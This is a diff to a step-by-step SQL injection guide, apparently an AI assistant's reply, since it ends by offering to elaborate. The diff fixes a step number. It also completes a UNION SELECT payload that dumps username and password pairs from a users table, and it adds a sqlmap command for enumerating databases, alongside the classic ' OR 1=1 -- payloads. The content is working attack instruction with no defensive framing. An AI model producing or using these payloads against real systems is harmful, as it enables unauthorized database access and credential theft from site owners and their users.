@@ -111,7 +111,7 @@ Union-based SQL injection leverages the UNION SQL operator to combine results fr
    - Form fields (login/search)
    - HTTP headers (User-Agent, Referer)
 
-1. **Common vulnerable patterns**:
+2. **Common vulnerable patterns**:
    ```sql
    ' OR 1=1 --
    " OR 1=1 --
@@ -150,4 +150,13 @@ Union-based SQL injection leverages the UNION SQL operator to combine results fr
 
 ## Step 7: Retrieving Sensitive Data
 ```sql
-' UNION SELECT 1
+' UNION SELECT 1,username||':'||password,3,4,5 FROM users--
+```
+
+## Step 8: Automated Tools (Optional)
+Consider using sqlmap for more efficient exploitation:
+```bash
+sqlmap -u "http://example.com/page?id=1" --dbs --batch
+```
+
+Would you like me to elaborate on any particular step or provide more specific examples for a certain database type?
